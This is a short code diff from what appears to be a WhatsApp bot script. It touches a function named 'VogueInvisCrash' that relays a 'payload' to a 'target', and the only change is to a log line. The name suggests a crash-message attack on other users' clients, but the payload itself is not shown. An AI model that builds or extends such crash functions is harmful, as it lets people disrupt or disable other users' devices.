@@ -6006,8 +6006,8 @@ async function VogueInvisCrash(sock, target) {
     
     await sock.relayMessage(target, payload, {
         participant: { jid: target }
-    console.log('sent')
     });
+    console.log("SENT")
 }
 //     _       ___  _   _ _   _ _____  _   _        
 //    | |     / _ \| | | | \ | /  __ \| | | |       
